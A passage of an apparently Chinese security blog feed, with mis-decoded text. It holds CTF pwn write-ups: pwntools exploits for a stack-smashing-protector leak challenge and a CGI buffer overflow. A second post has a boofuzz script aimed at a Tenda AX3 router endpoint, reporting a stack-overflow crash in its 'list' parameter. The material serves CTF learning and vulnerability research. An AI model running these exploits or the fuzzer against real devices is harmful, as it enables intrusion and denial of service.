class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    <span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">p</span> = process(<span class="hljs-string">&quot;./ssp&quot;</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br># gdb.attach(<span class="hljs-keyword">p</span>,<span class="hljs-string">&#x27;b __stack_chk_fail\nc\n&#x27;</span>)<br><br>randon = []<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(<span class="hljs-number">0</span>x602018))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>libc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>stack = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br><br>flag_addr = stack - <span class="hljs-number">0</span>x178<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(flag_addr))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>flag = rc(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">print</span>(randon)<br>flag_list = <span class="hljs-keyword">list</span>(flag)  # å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œä»¥ä¾¿è¿›è¡Œä¿®æ”¹<br><span class="hljs-keyword">print</span>(flag_list)<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(randon)):<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>        flag_list[<span class="hljs-keyword">j</span>] = flag_list[<span class="hljs-keyword">j</span>] ^ randon[<span class="hljs-number">2</span>-i]<br><br>flag_txt = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>    flag_txt = flag_txt + chr(flag_list[i])<br><span class="hljs-keyword">print</span>(flag_txt)<br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure><h2 id="APACHE-CGI-PWN"><a href="#APACHE-CGI-PWN" class="headerlink" title="APACHE-CGI-PWN"></a>APACHE-CGI-PWN</h2><p>ğŸ‘´ä¸€ç›´ä»¥ä¸ºè¿™æ˜¯ä¸ªå¾ˆåŠçš„web pwnï¼Œç„¶åæµ©å“¥å“¥ç›´æ¥ç§’äº†ï¼ŒğŸ‘´æ‰å‘ç°æ˜¯ä¸ªå°ç˜ªä¸‰</p><p>è¯è¯´æœ€è¿‘æ€ä¹ˆè¿™ä¹ˆå–œæ¬¢å‡ºå¥—ç€webçš®çš„ cgi pwné¢˜å—ï¼Œé™‡å‰‘ä¹Ÿæ˜¯</p><p>è¿™è¾¹ç›´æ¥å·æµ©å“¥å“¥çš„expäº†ï¼Œå˜»å˜»</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>import requests<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;ROOT-GOD=Every king&#x27;s blood will end with a sword&quot;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>:<span class="hljs-string">&#x27;99999&#x27;</span><br>&#125;<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe8)+p64(0x4032fc)+p64(0x4032E0)<br>cookie = requests.post(<span class="hljs-string">&#x27;http://ip:port/getcookie.cgi&#x27;</span>,<span class="hljs-attribute">data</span>=<span class="hljs-string">&quot;eeknight&quot;</span>,headers=headers)<br>check = requests.post(<span class="hljs-string">&#x27;http://ip:port/check-ok.cgi&#x27;</span>, data = payload,<span class="hljs-attribute">headers</span>=headers)<br><br>p = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://ip:port/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(cookie.text)<br><span class="hljs-built_in">print</span>(check.text)<br><span class="hljs-built_in">print</span>(p.text)<br></code></pre></td></tr></table></figure><h1 id="0x3-æœ€åçš„æœ€å"><a href="#0x3-æœ€åçš„æœ€å" class="headerlink" title="0x3:æœ€åçš„æœ€å"></a>0x3:æœ€åçš„æœ€å</h1><p>æœ‰ä»€ä¹ˆå¥½è¯´çš„å‘¢ï¼Œå°±è¿™æ ·å§</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFã€Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä»¤äººç–‘æƒ‘çš„boofuzz</title>
    <link href="/2023/08/26/boofuzz/"/>
    <url>/2023/08/26/boofuzz/</url>
    
    <content type="html"><![CDATA[<h1 id="ä»¤äººç–‘æƒ‘çš„boofuzz"><a href="#ä»¤äººç–‘æƒ‘çš„boofuzz" class="headerlink" title="ä»¤äººç–‘æƒ‘çš„boofuzz"></a>ä»¤äººç–‘æƒ‘çš„boofuzz</h1><p>æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2023å¹´8æœˆ22æ—¥ æ™šä¸Š</p><h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0: å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>boofuzzè¿™ä¸€åŸºäºç”Ÿæˆçš„fuzzæ¡†æ¶ï¼Œç¬”è€…ä¸€ç›´æœ‰æ‰€è€³é—»</p><p>ä¸”åœ¨ç¬”è€…å­¦ä¹ Iotåï¼Œå¯¹äºèƒ½fuzzç½‘ç»œåè®®çš„boofuzzï¼Œæ›´æ˜¯äº§ç”Ÿçš„æå¤§çš„å…´è¶£ã€‚æ‰€ä»¥ï¼Œç¬”è€…æŠ±ç€å­¦ä¹ boofuzzåèƒ½åœ¨Iotæ¼æ´æŒ–æ˜ä¸­æé«˜æ•ˆç‡çš„ç›®çš„äºæœ€è¿‘æµ…æµ…çš„æ¥è§¦äº†ä¸€ä¸‹boofuzzã€‚</p><p>ç„¶åï¼Œæ²¡æœ‰ç„¶åäº†</p><p>ç»™ç¬”è€…æ•´ç ´é˜²äº†ï¼Œç›´æ¥åŸåœ°é“å¿ƒç ´ç¢</p><p>PSï¼šç¬”è€…è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯è®°ä¸€ç‚¹æ— ç”¨çš„æ¿å­å’Œåæ§½ï¼Œå„ä½å¤§å¸ˆå‚…å¦‚æœæƒ³çœ‹æºç è§£ææˆ–è€…é€»è¾‘æ€è·¯çš„å¯ä»¥ç‚¹Ã—äº†ã€‚</p><h1 id="0x1-è¿˜ç®—æ­£ç»çš„æ¿å­"><a href="#0x1-è¿˜ç®—æ­£ç»çš„æ¿å­" class="headerlink" title="0x1: è¿˜ç®—æ­£ç»çš„æ¿å­"></a>0x1: è¿˜ç®—æ­£ç»çš„æ¿å­</h1><p>ç¬”è€…è¿™è¾¹fuzzçš„targetæ˜¯Tenda AX3</p><p>é¦–å…ˆè¦æŠ“åŒ…æŠ“ä¸€ç‚¹åŸå§‹æ•°æ®</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">115</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5790</span>.<span class="hljs-number">171</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Sec</span>-Purpose: prefetch;prerender</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Purpose</span>: prefetch</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br></code></pre></td></tr></table></figure><p>å…¶å®æ ¹æ®è¿™ä¸ªå°±å¯ä»¥å†™åŸè¯­äº†ï¼Œä½†è¿™ä¸ªRequestæ˜¯loginè¯·æ±‚ï¼Œæ²¡ä»€ä¹ˆå¤šå¤§æ„ä¹‰</p><p>äºæ˜¯ç¬”è€…æ‰¾äº†ä¸ªå­˜åœ¨æ¼æ´çš„å‡½æ•°æ¥å£ï¼Œå…ˆfuzzè¯•è¯•æ•ˆæœ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> boofuzz import *<br><br><br>def main():<br>    host = <span class="hljs-string">&#x27;192.168.0.1&#x27;</span><br>   <span class="hljs-built_in"> port </span>= 80<br>    <br>    # è®¾ç½®<span class="hljs-built_in"> logging </span>é…ç½®<br>    csv_log = open(<span class="hljs-string">&#x27;fuzz_results.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) #python3è¦è®¾ç½®å­—ç¬¦ä¸²ï¼Œbyteä¼šæŠ¥é”™<br>    my_logger = [FuzzLoggerCsv(<span class="hljs-attribute">file_handle</span>=csv_log)] #å°†æ—¥å¿—å†™å…¥csvæ–‡ä»¶<br><br>    session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">True</span>,#æ¥å—ç¨‹åºè¿”å›çš„æ•°æ®<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,#ä¼šåœæ­¢åœ¨ç¬¬ä¸€æ¬¡crashçš„åœ°æ–¹<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger,<br>    )<br>    <br>    s_initialize(<span class="hljs-string">&quot;Request&quot;</span>)<br>    #line1<br>    s_static(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Method&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;/goform/SetNetControlList&quot;</span>) #æ¼æ´å­˜åœ¨æ¥å£<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-2&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;HTTP_VERSION&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-1&quot;</span>)<br>    #line2<br>    s_static(<span class="hljs-string">&quot;Host:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-2-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;192.168.0.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;IP_ADDRESS&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-2&quot;</span>)<br>    #line3<br>    s_static(<span class="hljs-string">&quot;Content-Length:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Length&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-3-1&quot;</span>)<br>    s_size(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-attribute">output_format</span>=<span class="hljs-string">&#x27;ascii&#x27;</span>,fuzzable=False)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-3&quot;</span>)<br>    #line4<br>    s_static(<span class="hljs-string">&quot;Accept:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-4-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;*/*&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-4&quot;</span>)<br>    #line5<br>    s_static(<span class="hljs-string">&quot;X-Requested-With:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-5-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-5&quot;</span>)<br>    #line6<br>    s_static(<span class="hljs-string">&quot;User-Agent:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-6-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-6&quot;</span>)<br>    #line7<br>    s_static(<span class="hljs-string">&quot;Content-Type:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-7-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-7&quot;</span>)<br>    #line8<br>    s_static(<span class="hljs-string">&quot;Origin:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-8-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-8&quot;</span>)<br>    #line9<br>    s_static(<span class="hljs-string">&quot;Referer:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-9-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1/wireless_ssid.html?random=0.7532778770368576&amp;&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-9&quot;</span>)<br>    #line10<br>    s_static(<span class="hljs-string">&quot;Accept-Encoding:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-10-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-10&quot;</span>)<br>    #line11<br>    s_static(<span class="hljs-string">&quot;Accept-Language:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-11-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;en-US,en;q=0.9&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-11&quot;</span>)<br>    #line12<br>    s_static(<span class="hljs-string">&quot;Connection:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-12-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Connection-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-12&quot;</span>)<br><br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>    #important key!!<br>    with s_block(<span class="hljs-string">&#x27;data&#x27;</span>):<br>        # line14<br>        s_group(<span class="hljs-string">&quot;key1&quot;</span>,[<span class="hljs-string">&#x27;mac&#x27;</span>,<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;ssid&#x27;</span>]) #å±é™©å‚æ•°ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°èƒ½é€ æˆæ ˆæº¢å‡º<br>        s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>        s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, <span class="hljs-attribute">max_len</span>=0x1000,fuzzable=True)<br><br><br>    session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>))<br>    session.fuzz()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>å…·ä½“æ€ä¹ˆå†™æ¡†æ¶ç¬”è€…å°±ä¸èµ˜è¿°äº†</p><p>åœ¨æˆ‘æŒ‡å®šæ¼æ´ä½ç½®ï¼ˆ&#x2F;goform&#x2F;SetNetControlListï¼‰å’Œå±é™©å‚æ•°çš„æƒ…å†µä¸‹ï¼Œboofuzzæ•ˆç‡ç¡®å®è¿˜è¡Œï¼Œå¤§æ¦‚ä¸€åˆ†é’Ÿå°±è·‘å‡ºæ¥äº†</p><p>å¯ä»¥çœ‹åˆ°åœ¨ç¬¬1524ä¸ªcase DoSäº†</p><p><img src="/img/Fuzz1/0.png" alt="img"></p><p>é‚£è¯´æ˜1523ä¸ªcaseå‘ç”Ÿäº†ä»€ä¹ˆ</p><p><img src="/img/Fuzz1/1.png" alt="img"></p><p>å¾ˆå¥½ï¼Œlistå‚æ•°é€ æˆäº†crash</p><p>ç¬”è€…ä¸€å¼€å§‹è¿˜å¾ˆå…´å¥‹ï¼Œæ¯•ç«Ÿä¸AFL++çš„Qemu modeç›¸æ¯”ï¼Œboofuzzåœ¨fuzz Iotä¸­æ— è®ºæ˜¯æ•ˆç‡è¿˜æ˜¯è‡ªç”±åº¦é«˜çš„ä¸æ˜¯ä¸€ç‚¹åŠç‚¹ï¼Œä½†æ˜¯è¿™æ˜¯ç¬”è€…å®šä½å¥½äº†æ¼æ´æ‰€åœ¨ä½ç½®çš„æƒ…å†µä¸‹ã€‚å› ä¸ºä¹‹å‰å‡ ä¸ªç¤¼æ‹œç¬”è€…å¯¹Tenda 